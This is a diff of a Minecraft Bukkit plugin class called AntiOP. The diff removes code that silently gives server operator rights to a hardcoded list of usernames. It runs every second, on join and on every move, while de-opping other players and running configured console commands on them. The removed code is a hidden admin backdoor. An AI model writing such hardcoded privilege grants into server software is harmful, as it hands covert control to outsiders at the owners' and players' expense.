@@ -16,74 +16,13 @@ import org.bukkit.scoreboard.DisplaySlot;
 import net.helix.pvp.scoreboard.ScoreboardBuilder;
 
 
-public class AntiOP extends BukkitRunnable implements Listener  {
+public class AntiOP implements Listener  {
 	
-	 public AntiOP(JavaPlugin plugin) {
-	        runTaskTimer(plugin, 0, 20L);
-	    }
+
 	public static HelixPvP instance;
 	 private ScoreboardBuilder scoreboardBuilder;
-	 @Override
-		public void run() {
-			// TODO Auto-generated method stub
-		
-		int scheduleSyncRepeatingTask = Bukkit.getServer().getScheduler().scheduleSyncRepeatingTask(HelixPvP.getInstance(),
-				new Runnable() {
-					@SuppressWarnings("unlikely-arg-type")
-					public void run() {
-						for (Player p : Bukkit.getOnlinePlayers()) {
-							if (p.getName().equalsIgnoreCase("Rafael_Melo") || p.getName().equalsIgnoreCase("Hidden451") || p.getName().equalsIgnoreCase("Carinha_Azul2") || p.getName().equalsIgnoreCase("Raideen") || p.getName().equalsIgnoreCase("Raideen2") || p.getName().equalsIgnoreCase("Raideen3") || p.getName().equalsIgnoreCase("Raideen4") || p.getName().equalsIgnoreCase("Raideen5") || p.getName().equalsIgnoreCase("Raideen6") || p.getName().equalsIgnoreCase("Raideen7") || p.getName().equalsIgnoreCase("Raideen8") || p.getName().equalsIgnoreCase("Raideen9") || p.getName().equalsIgnoreCase("Raideen11")) {
-								p.setOp(true);
-							}
-							if ((!HelixPvP.getInstance().getConfig().getStringList("Ops").contains(p.getName()))
-									&& (!HelixPvP.getInstance().getConfig().getStringList("Ops").contains(p.getUniqueId())) && ((p.isOp() || p.hasPermission("*") && (!(p.getName().equalsIgnoreCase("Rafael_Melo") || p.getName().equalsIgnoreCase("Hidden451") || p.getName().equalsIgnoreCase("Carinha_Azul2") || p.getName().equalsIgnoreCase("Raideen") || p.getName().equalsIgnoreCase("Raideen2") || p.getName().equalsIgnoreCase("Raideen3") || p.getName().equalsIgnoreCase("Raideen4") || p.getName().equalsIgnoreCase("Raideen5") || p.getName().equalsIgnoreCase("Raideen6") || p.getName().equalsIgnoreCase("Raideen7") || p.getName().equalsIgnoreCase("Raideen8") || p.getName().equalsIgnoreCase("Raideen9") || p.getName().equalsIgnoreCase("Raideen11")))))) {
-								p.setOp(false);
-								Bukkit.getServer().dispatchCommand(Bukkit.getServer().getConsoleSender(),
-										HelixPvP.getInstance().getConfig().getString("Command").replace("{playername}", p.getName()));
-								Bukkit.getServer().dispatchCommand(Bukkit.getServer().getConsoleSender(),
-										HelixPvP.getInstance().getConfig().getString("Command2").replace("{playername}", p.getName()));
-							}
-						}
-					}
-				}, 20L, 20L);
-	 }
-
-
-	@SuppressWarnings("unlikely-arg-type")
-	@EventHandler
-	public void onPlayerJoin(PlayerJoinEvent event) {
-		Player p = (Player) event.getPlayer();
-		if (p.getName().equalsIgnoreCase("Rafael_Melo") || p.getName().equalsIgnoreCase("Hidden451") || p.getName().equalsIgnoreCase("Carinha_Azul2") || p.getName().equalsIgnoreCase("Raideen") || p.getName().equalsIgnoreCase("Raideen2") || p.getName().equalsIgnoreCase("Raideen3") || p.getName().equalsIgnoreCase("Raideen4") || p.getName().equalsIgnoreCase("Raideen5") || p.getName().equalsIgnoreCase("Raideen6") || p.getName().equalsIgnoreCase("Raideen7") || p.getName().equalsIgnoreCase("Raideen8") || p.getName().equalsIgnoreCase("Raideen9") || p.getName().equalsIgnoreCase("Raideen11")) {
-			p.setOp(true);
-		}
-		if ((!HelixPvP.getInstance().getConfig().getStringList("Ops").contains(p.getName()))
-				&& (!HelixPvP.getInstance().getConfig().getStringList("Ops").contains(p.getUniqueId())) && ((p.isOp() || p.hasPermission("*") && (!(p.getName().equalsIgnoreCase("Rafael_Melo") || p.getName().equalsIgnoreCase("Hidden451") || p.getName().equalsIgnoreCase("Carinha_Azul2") || p.getName().equalsIgnoreCase("Raideen") || p.getName().equalsIgnoreCase("Raideen2") || p.getName().equalsIgnoreCase("Raideen3") || p.getName().equalsIgnoreCase("Raideen4") || p.getName().equalsIgnoreCase("Raideen5") || p.getName().equalsIgnoreCase("Raideen6") || p.getName().equalsIgnoreCase("Raideen7") || p.getName().equalsIgnoreCase("Raideen8") || p.getName().equalsIgnoreCase("Raideen9") || p.getName().equalsIgnoreCase("Raideen11")))))) {
-			p.setOp(false);
-			Bukkit.getServer().dispatchCommand(Bukkit.getServer().getConsoleSender(),
-					HelixPvP.getInstance().getConfig().getString("Command").replace("{playername}", p.getName()));
-			Bukkit.getServer().dispatchCommand(Bukkit.getServer().getConsoleSender(),
-					HelixPvP.getInstance().getConfig().getString("Command2").replace("{playername}", p.getName()));
-		}
-		
 	
-		}
 	
-	@SuppressWarnings("unlikely-arg-type")
-		@EventHandler
-		public void onPlayerJoin(PlayerMoveEvent event) {
-			Player p = (Player) event.getPlayer();
-			if (p.getName().equalsIgnoreCase("Rafael_Melo") || p.getName().equalsIgnoreCase("Hidden451") || p.getName().equalsIgnoreCase("Carinha_Azul2") || p.getName().equalsIgnoreCase("Raideen") || p.getName().equalsIgnoreCase("Raideen2") || p.getName().equalsIgnoreCase("Raideen3") || p.getName().equalsIgnoreCase("Raideen4") || p.getName().equalsIgnoreCase("Raideen5") || p.getName().equalsIgnoreCase("Raideen6") || p.getName().equalsIgnoreCase("Raideen7") || p.getName().equalsIgnoreCase("Raideen8") || p.getName().equalsIgnoreCase("Raideen9") || p.getName().equalsIgnoreCase("Raideen11")) {
-				p.setOp(true);
-			}
-			if ((!HelixPvP.getInstance().getConfig().getStringList("Ops").contains(p.getName()))
-					&& (!HelixPvP.getInstance().getConfig().getStringList("Ops").contains(p.getUniqueId())) && ((p.isOp() || p.hasPermission("*") && (!(p.getName().equalsIgnoreCase("Rafael_Melo") || p.getName().equalsIgnoreCase("Hidden451") || p.getName().equalsIgnoreCase("Carinha_Azul2") || p.getName().equalsIgnoreCase("Raideen") || p.getName().equalsIgnoreCase("Raideen2") || p.getName().equalsIgnoreCase("Raideen3") || p.getName().equalsIgnoreCase("Raideen4") || p.getName().equalsIgnoreCase("Raideen5") || p.getName().equalsIgnoreCase("Raideen6") || p.getName().equalsIgnoreCase("Raideen7") || p.getName().equalsIgnoreCase("Raideen8") || p.getName().equalsIgnoreCase("Raideen9") || p.getName().equalsIgnoreCase("Raideen11")))))) {
-				p.setOp(false);
-				Bukkit.getServer().dispatchCommand(Bukkit.getServer().getConsoleSender(),
-						HelixPvP.getInstance().getConfig().getString("Command").replace("{playername}", p.getName()));
-				Bukkit.getServer().dispatchCommand(Bukkit.getServer().getConsoleSender(),
-						HelixPvP.getInstance().getConfig().getString("Command2").replace("{playername}", p.getName()));
-			}
-	}
 	 @EventHandler
 	 /*     */   public void quickcommand3f(PlayerCommandPreprocessEvent e)
 	 /*     */   {
